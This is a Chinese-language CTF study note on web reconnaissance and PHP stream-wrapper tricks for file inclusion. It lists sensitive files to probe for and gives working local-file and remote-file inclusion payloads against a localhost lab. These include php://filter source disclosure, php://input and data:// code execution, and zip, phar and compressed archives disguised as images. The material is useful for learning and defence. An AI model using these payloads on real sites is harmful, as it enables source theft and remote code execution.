## web

关于Web的敏感文件有：
1. robots.txt文件是一种叫做robots的协议。其文件常在网站根目录下。告诉网络爬虫，哪些文件或者文件夹可以被网络爬虫获取。哪些文件不可以被网络爬虫获取。
2. readme.md是一种以MarkeDown格式书写的文件。通常记录一些CMS版本的信息。部分提供其CMS的GitHub地址。
3. www.zip/rar/tar.gz 是一种压缩包格式的文件。
4. index.php或者index.php~


### Web渗透信息收集

系统漏洞-->中间件漏洞-->web漏洞

信息收集分为主动收集和被动收集。主动收集是与目标主机进行直接交互，从而获取所需的目标信息。被动信息收集是不与目标主机进行直接交互，通过搜索引擎等方式间接的获取目标主机的信息。


### PHP伪协议

具体题目：[[极客大挑战 2019]Secret File 1](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)

经验一：看到flag.php应该联想到php伪协议，读取文件源码：
```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

#### file://协议

1. file://[文件的绝对路径和文件名]
```
http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
```
![image](https://user-images.githubusercontent.com/27406337/164958344-118408cf-3ecf-409b-a9e3-0de13e81ad04.png)

2. 文件相对路径和文件名

```
http://127.0.0.1/include.php?file=./phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958372-33d4b647-0a55-4a83-a501-a64e09be9ac5.png)

3. http：//网络路径和文件名

```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

#### php://协议

php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。

![image](https://user-images.githubusercontent.com/27406337/164958421-551240a5-a32d-4ba0-9647-b49249d7b652.png)

- php://filter参数详解

|php://filter参数|描述|
|--|--|
|resource=<要过滤的数据流>|必须项。它指定了你要筛选过滤的数据流。|
|read=<读链的过滤器>|可选项。可以设定一个或多个过滤器名称，以管道符（\*\	\*）分隔。|
|write=<写链的过滤器>|可选项。可以设定一个或多个过滤器名称，以管道符（\	）分隔。|
|<; 两个链的过滤器>|任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。|

- 可用过滤器列表

![image](https://user-images.githubusercontent.com/27406337/164958515-4a04a3bc-af3e-49a9-9c95-846a42ddcd3b.png)

![image](https://user-images.githubusercontent.com/27406337/164958521-b3afecca-fc6a-4713-a62e-e794b952389f.png)

![image](https://user-images.githubusercontent.com/27406337/164958525-bef470eb-29cc-47da-a681-ae339bf51eb8.png)


示例：
1. php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）

```
http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
```
![image](https://user-images.githubusercontent.com/27406337/164958549-0cf1d547-7d4c-440b-9b89-0331421b0a28.png)

2. php://input + [POST DATA]执行php代码

![image](https://user-images.githubusercontent.com/27406337/164958567-e44b6312-a113-45e4-99b4-f37e51d22d50.png)


#### zip:// & bzip2:// & zlib:// 协议

zip:// & bzip2:// & zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。

1. zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）
压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传。
```
http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
```
![image](https://user-images.githubusercontent.com/27406337/164958598-225defff-d965-4635-9d89-41ce0ea99368.png)

2. compress.bzip2://file.bz2
压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）
```
http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
```
![image](https://user-images.githubusercontent.com/27406337/164958616-3a68cc6e-0d0a-49ac-90dc-d62b27bac2c5.png)

3. compress.zlib://file.gz
压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）

```
http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
```
![image](https://user-images.githubusercontent.com/27406337/164958634-5e1c0d25-1fdf-4365-b397-4d681478eef8.png)


#### data:// 协议

1. data://text/plain,
```
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
```
![image](https://user-images.githubusercontent.com/27406337/164958676-eff4ed97-11d3-4ae4-9b6c-e1312cc2049c.png)

2. data://text/plain;base64,
```
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
```

![image](https://user-images.githubusercontent.com/27406337/164958688-3ee35831-d69e-4a93-9d36-75004b68eb60.png)

3. http:// & https:// 协议
```
http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958699-f71aec6e-6a94-4875-8bb0-d6d2777afa4e.png)

#### phar:// 协议

```
http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
```

![image](https://user-images.githubusercontent.com/27406337/164958709-ef7ff286-01b0-48ef-884f-f628b1c249bf.png)


参考：[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)